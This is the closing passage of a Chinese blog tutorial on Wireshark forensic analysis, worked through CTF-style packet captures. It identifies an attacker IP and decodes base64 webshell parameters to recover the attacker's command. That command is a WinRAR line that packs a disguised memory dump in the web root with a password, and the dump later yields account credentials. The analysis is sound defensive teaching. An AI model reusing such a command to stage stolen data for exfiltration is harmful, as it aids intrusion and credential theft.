+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271535310.png" data-fancybox="true"/></div></div>
+
+<p>排除一些无用选项<code>!smp &amp;&amp; ip.src != 10.3.4.96</code>,发现了<code>ping</code></p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271636122.png" data-fancybox="true"/></div></div>
+
+<p>可以看到<code>10.3.4.3</code>一直在主动<code>ping 10.3.4.55</code>可以确定<code>10.3.4.3</code>为黑客IP</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407271535607.png" data-fancybox="true"/></div></div>
+
+<h3 id="WebShell-pcap"><a href="#WebShell-pcap" class="headerlink" title="WebShell.pcap"></a>WebShell.pcap</h3><p>将http导出为php,然后去分析包</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242021939.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242021084.png" data-fancybox="true"/></div></div>
+
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242022904.png" data-fancybox="true"/></div></div>
+<p>导出后逐渐分析每个文件,会在config(25).php中发现敏感操作,类似于压缩文件包的操作</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242027433.png" data-fancybox="true"/></div></div>
+<p>继续往下分析包,找他有没有下载嘛,发现config(31).php文件最大嘛,改后缀名,改成.rar,打开后发现有密码,再返回去看他是怎么压缩的包嘛,看看他有没有设置密码</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242029927.png" data-fancybox="true"/></div></div>
+<p>响应包是config(25).php,那么请求包盲猜24呗,打开后发现是url编码了,解码看一下</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242031588.png" data-fancybox="true"/></div></div>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242031647.png" data-fancybox="true"/></div></div>
+<p>发现他做了base64_encode嘛,那我们将每一个值都解码一下呗,发现z2解码后是命令</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242032000.png" data-fancybox="true"/></div></div>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /d <span class="string">&quot;c:\inetpub\wwwroot\&quot;&amp;C:\progra~1\WinRAR\rar a C:\Inetpub\wwwroot\backup\wwwroot.rar C:\Inetpub\wwwroot\backup\1.gif -hpJJBoom&amp;echo [S]&amp;cd&amp;echo [E]</span></span><br></pre></td></tr></table></figure>
+<p>查找帮助文档,发现-hp是设置密码,那么JJBoom就是密码呗</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242033231.png" data-fancybox="true"/></div></div>
+<p>解压出来之后发现,是个gif图,但是打不开</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242034441.png" data-fancybox="true"/></div></div>
+<p>拖进010查看一下发现文件头是mdmp</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242035170.png" data-fancybox="true"/></div></div>
+<p>将后缀名改为mdmp,不知道mdmp是啥,Google一下</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242036349.png" data-fancybox="true"/></div></div>
+<p>进去搜一下mdmp</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242037431.png" data-fancybox="true"/></div></div>
+<p>那就跟着教程走嘛,发现分析出来的是某一台机器的账号密码</p>
+<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210242019878.png" data-fancybox="true"/></div></div>
+
+<div class="article-footer fs14">
+    <section id="references">
+      <div class="header"><span>参考资料</span></div>
+      <div class="body">
+        <ul>
+        <li class="post-title">
+          <p><a target="_blank" rel="noopener" href="https://www.easy-tcp-analysis.tools/login">Easy-TCP-Analysis-Tools</a></p>
+
+        </li>
+        
+        <li class="post-title">
+          <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zichliang/p/17477251.html">抓包工具Wireshark使用教程</a></p>
+
+        </li>
+        </ul>
+      </div>
+    </section>
+    
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文由 <a href="https://jiangjiyue.github.io/">kill3r</a> 原创,采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://jiangjiyue.github.io/2024/07/04/dd58c5ed/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/b32ef3da1162a.svg" /></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://jiangjiyue.github.io/2024/07/04/dd58c5ed/&title=应急响应之Wireshark流量分析 - SafeKiller Zone&pics=https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202407231917184.webp&summary=
+    总字符数: 24.33K 
+    
+    
+    代码: 7.43K, 文本: 4.96K
+    
+    
+    预计阅读时间: 54 分钟
+    
+    
+
+
+    
+    
+    
+    
+   ..."><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/80c07e4dbb303.svg" /></a><a class="social share-item email" href="mailto:?subject=应急响应之Wireshark流量分析 - SafeKiller Zone&amp;body=https://jiangjiyue.github.io/2024/07/04/dd58c5ed/"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/a1b00e20f425d.svg" /></a><a class="social share-item link" onclick="util.copy(&quot;copy-link&quot;, &quot;复制成功&quot;)"><img class="lazy"  src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/8411ed322ced6.svg" /></a></div>
+        
+        <div class="qrcode" id="qrcode-wechat" style="opacity:0;height:0">
+          <img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://api.qrserver.com/v1/create-qr-code/?size=256x256&data=https://jiangjiyue.github.io/2024/07/04/dd58c5ed/"/>
+        </div>
+        
+      </div>
+    </section>
+    </div>
+</article>
+<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/07/05/dd58c5ed/">应急响应之Webshell流量分析</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/07/03/ac635236/">应急响应-从攻击谈防守</a></div></section></div>
+
+<div class="related-wrap" id="related-posts">
+    <section class='header'>
+      <div class='title cap theme'>您可能感兴趣的文章</div>
+    </section>
+    <section class='body'>
+    <div class="related-posts"><a class="item" href="\2024\07\05\dd58c5ed\" title="应急响应之Webshell流量分析"><span class="title">应急响应之Webshell流量分析</span></a><a class="item" href="\2021\09\19\2dd5e334\" title="ELK收集nginx日志并展示来源IP地图"><span class="title">ELK收集nginx日志并展示来源IP地图</span></a><a class="item" href="\2022\09\06\6e6b1513\" title="基于Awstats的Apache日志分析"><span class="title">基于Awstats的Apache日志分析</span></a><a class="item" href="\2024\07\03\ac635236\" title="应急响应-从攻击谈防守"><span class="title">应急响应-从攻击谈防守</span></a><a class="item" href="\2024\09\24\3c3f9499\" title="CS-Cobalt Strike必备知识"><span class="title">CS-Cobalt Strike必备知识</span></a></div></section></div>
+
+
+  <div class="related-wrap md-text" id="comments">
+    <section class='header cmt-title cap theme'>
+      <p>快来参与讨论吧~</p>
+
+    </section>
+    <section class='body cmt-body waline'>
+      
+
+<div id="waline_container" class="waline_thread"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </section>
+  </div>
+
+
+
+<footer class="page-footer footnote"><hr><div class="sitemap"><div class="sitemap-group"><span class="fs15">博客</span><a href="/">近期</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archives/">归档</a><a href="/tools/">工具</a></div><div class="sitemap-group"><span class="fs15">笔记</span><a href="/wiki/tags/DevOps/index.html">DevOps</a><a href="/wiki/tags/Vulnerability/index.html">常见漏洞分析</a><a href="/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/">编程语言</a></div><div class="sitemap-group"><span class="fs15">社交</span><a href="/friends/">友链</a><a href="/comments/">留言板</a></div><div class="sitemap-group"><span class="fs15">更多</span><a href="/about/">关于本站</a><a target="_blank" rel="noopener" href="https://github.com/JiangJiYue">GitHub</a></div></div><div class="text"><center>
+  <p>本破站由 <a href="/">@SafeKiller Zone</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar">Stellar</a> 主题创建。<br>本博客部分素材来源于网络，如有侵权请联系<a href="mailto:jiangjiyue1@gmail.com">jiangjiyue1@gmail.com</a>删除<br>本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
+  <!--不蒜子计数器-->
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  <span>本"页面"访问 <span id="busuanzi_value_page_pv"></span> 次 | 👀总访问 <span id="busuanzi_value_site_pv"></span> 次 | 总访客 <span id="busuanzi_value_site_uv"></span> 人</span>
+  <br>
+  <span id="runtime_span"></span>
+  <script type="text/javascript">
+    // JavaScript for showing runtime here
+  </script>
+</center>
+<div style="display: flex;justify-content: center;align-items: center;margin: 10px;">
+  <a target="_blank" rel="noopener" href="https://notbyai.fyi/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/Written-By-Human-white.png" style="width:140px;height:50px;margin-right: 10px " id='notbyai'></a>
+  <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/assets/website/by-nc-sa.eu.png" style="width:140px;height:50px"></a>
+</div>
+</div></footer>
+<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
+<div class="widgets">
+
+
+
+<widget class="widget-wrapper toc" id="data-toc" collapse="false"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Wireshark%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8"><span class="toc-text">Wireshark基本使用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CTF"><span class="toc-text">CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B0%8F%E8%AF%95%E7%89%9B%E5%88%80"><span class="toc-text">小试牛刀</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E6%B5%81%E9%87%8F%E6%A3%80%E6%B5%8B"><span class="toc-text">扫描流量检测</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0"><span class="toc-text">描述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3"><span class="toc-text">题解</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E5%8F%96%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-text">提取压缩包</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0-1"><span class="toc-text">描述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-1"><span class="toc-text">题解</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E7%AC%A6%E6%8F%90%E5%8F%96"><span class="toc-text">关键字符提取</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0-2"><span class="toc-text">描述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E9%A2%98%E8%A7%A3-2"><span class="toc-text">题解</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E6%8F%90%E5%8F%96"><span class="toc-text">特殊字符提取</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8F%8F%E8%BF%B0-3"><span class="toc-text">描述</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E6%8F%90%E5%8F%96"><span class="toc-text">文件提取</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#ISG-pcap"><span class="toc-text">ISG.pcap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#final-pcap"><span class="toc-text">final.pcap</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AF%BC%E5%87%BA%E5%AF%B9%E8%B1%A1"><span class="toc-text">导出对象</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E4%B8%AD%E7%9A%84%E7%BA%BF%E7%B4%A2-pcapng"><span class="toc-text">流量中的线索.pcapng</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Misc-%E6%88%91%E6%8A%93%E5%88%B0%E4%BD%A0%E4%BA%86"><span class="toc-text">Misc-我抓到你了</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#fly-pcapng"><span class="toc-text">fly.pcapng</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Flag"><span class="toc-text">Flag</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-text">流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#webone-pcap"><span class="toc-text">webone.pcap</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%AF%86%E5%88%AB%E6%89%AB%E6%8F%8F%E5%99%A8"><span class="toc-text">识别扫描器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%99%BB%E9%99%86%E5%90%8E%E5%8F%B0"><span class="toc-text">登陆后台</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81"><span class="toc-text">账号密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#WebShell"><span class="toc-text">WebShell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90WebShell%E8%A1%8C%E4%B8%BA"><span class="toc-text">分析WebShell行为</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#robots-txt"><span class="toc-text">robots.txt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81"><span class="toc-text">数据库密码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E5%8D%A1%E4%BF%A1%E6%81%AF"><span class="toc-text">网卡信息</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webtwo-pcap"><span class="toc-text">webtwo.pcap</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#hash-code"><span class="toc-text">hash_code</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ijnu%E5%AF%86%E7%A0%81"><span class="toc-text">ijnu密码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mail-pcap"><span class="toc-text">mail*.pcap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#vpn-pcap"><span class="toc-text">vpn*.pcap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebShell-pcap"><span class="toc-text">WebShell.pcap</span></a></li></ol></li></ol></div><div class="widget-footer">
+
+<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a></div></widget>
+</div></aside><div class='float-panel blur'>
+  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
+  </button>
+  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
+    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
+  </button>
+</div>
+</div><div class="scripts">
+<script type="text/javascript">
+  const ctx = {
+    date_suffix: {
+      just: `刚刚`,
+      min: `分钟前`,
+      hour: `小时前`,
+      day: `天前`,
+    },
+    root : `/`,
+  };
+
+  // required plugins (only load if needs)
+  if (`local_search`) {
+    ctx.search = {};
+    ctx.search.service = `local_search`;
+    if (ctx.search.service == 'local_search') {
+      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"codeblock":true,"sort":"-date"}`);
+      ctx.search[ctx.search.service] = service_obj;
+    }
+  }
+  const def = {
+    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/3442075.svg`,
